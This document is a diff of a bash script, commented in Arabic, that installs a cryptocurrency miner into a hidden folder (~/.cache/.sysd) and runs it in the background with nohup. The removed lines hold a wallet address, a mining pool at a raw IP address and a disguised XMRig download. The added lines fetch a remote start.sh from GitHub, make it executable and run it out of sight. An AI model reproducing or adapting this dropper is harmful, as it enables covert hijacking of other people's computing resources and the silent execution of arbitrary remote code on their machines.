@@ -1,21 +1,16 @@
 #!/bin/bash
 
 # إعداد بيانات المحفظة والمعدّن
-APP_NAME="scala"
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="100"
-POOL="45.155.102.89:443"
-THREADS=
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
 # تحميل النسخة الجاهزة من XMRig (Linux x64)
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
+wget https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh
 
 # فك الضغط
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
+chmod +x start.sh
+
 
 # تشغيل المعدّن في الخلفية باستخدام nohup
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+nohup ./start.sh > cpu_output.log 2>&1 &
